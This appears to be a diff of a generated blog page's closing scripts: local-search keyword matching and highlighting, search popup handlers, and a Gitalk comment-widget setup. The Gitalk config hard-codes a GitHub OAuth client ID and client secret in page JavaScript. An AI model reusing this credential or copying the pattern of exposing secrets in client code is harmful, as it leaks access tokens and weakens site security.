+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-md5@latest/src/md5.min.js"></script><script>function loadGitalk () {
+  if (!document.getElementById('gitalk-container')) {
+    return;
+  }
+
+  var gitalk = new Gitalk({
+    id: md5(window.location.pathname.slice(1)),
+    clientID: '28f6b94423100cc8a01d',
+    clientSecret: '812ec412a6abb31e41feedc3fa3ba97eefa1a882',
+    repo: 'Sculptor-liu.github.io',
+    owner: 'Sculptor-liu',
+    admin: ['Sculptor-liu'],
+    distractionFreeMode: 'false',
+    language: 'zh-CN'
+  });
+  gitalk.render('gitalk-container');
+}
+
+if (false) {
+  loadGitalk();
+} else {
+  window.addEventListener('DOMContentLoaded', loadGitalk, false);
+}</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script><script type="application/json" src="/search.xml"></script></body></html>
